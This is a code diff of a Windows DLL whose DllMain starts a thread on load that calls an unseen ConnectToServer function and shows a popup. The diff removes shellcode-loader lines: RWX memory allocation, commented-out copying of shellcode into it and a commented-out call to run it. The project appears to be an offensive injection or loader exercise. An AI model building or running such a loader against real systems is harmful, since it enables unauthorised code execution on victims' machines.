@@ -77,34 +77,19 @@ extern "C" __declspec(dllexport) void ConnectToServer() {
 DWORD WINAPI ThreadFunction(LPVOID lpParameter)
 {
 
-	LPVOID newMemory;
-	HANDLE currentProcess;
-	SIZE_T bytesWritten;
-	BOOL didWeCopy = FALSE;
+    LPVOID newMemory;
+    HANDLE currentProcess;
+    SIZE_T bytesWritten;
+    BOOL didWeCopy = FALSE;
 
-	// Get the current process handle 
-	currentProcess = GetCurrentProcess();
+    // Get the current process handle 
+    currentProcess = GetCurrentProcess();
 
 
-	// Allocate memory with Read+Write+Execute permissions 
-	newMemory = VirtualAllocEx(currentProcess, NULL, SHELLCODELEN, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
-
-	if (newMemory == NULL)
-		return -1;
     ConnectToServer();
+    MessageBox(NULL, L"Hello World!", L"Popup DLL", MB_OK);
 
-	MessageBox(NULL, L"Hello World!", L"Popup DLL", MB_OK);
-
-	// Copy the shellcode into the memory we just created 
-	//didWeCopy = WriteProcessMemory(currentProcess, newMemory, (LPCVOID)&shellcode, SHELLCODELEN, &bytesWritten);
-
-	//if (!didWeCopy)
-	//	return -2;
-
-	// Yay! Let's run our shellcode! 
-	//((void(*)())newMemory)();
-
-	return 1;
+    return 1;
 }
 
 
@@ -114,30 +99,30 @@ BOOL WINAPI
 DllMain(HANDLE hDll, DWORD dwReason, LPVOID lpReserved)
 {
 
-	HANDLE threadHandle;
+    HANDLE threadHandle;
 
-	switch (dwReason)
-	{
-	case DLL_PROCESS_ATTACH:
+    switch (dwReason)
+    {
+    case DLL_PROCESS_ATTACH:
 
-		// Create a thread and close the handle as we do not want to use it to wait for it 
+        // Create a thread and close the handle as we do not want to use it to wait for it 
 
-		threadHandle = CreateThread(NULL, 0, ThreadFunction, NULL, 0, NULL);
-		CloseHandle(threadHandle);
+        threadHandle = CreateThread(NULL, 0, ThreadFunction, NULL, 0, NULL);
+        CloseHandle(threadHandle);
 
-		break;
+        break;
 
-	case DLL_PROCESS_DETACH:
-		// Code to run when the DLL is freed
-		break;
+    case DLL_PROCESS_DETACH:
+        // Code to run when the DLL is freed
+        break;
 
-	case DLL_THREAD_ATTACH:
-		// Code to run when a thread is created during the DLL's lifetime
-		break;
+    case DLL_THREAD_ATTACH:
+        // Code to run when a thread is created during the DLL's lifetime
+        break;
 
-	case DLL_THREAD_DETACH:
-		// Code to run when a thread ends normally.
-		break;
-	}
-	return TRUE;
+    case DLL_THREAD_DETACH:
+        // Code to run when a thread ends normally.
+        break;
+    }
+    return TRUE;
 }
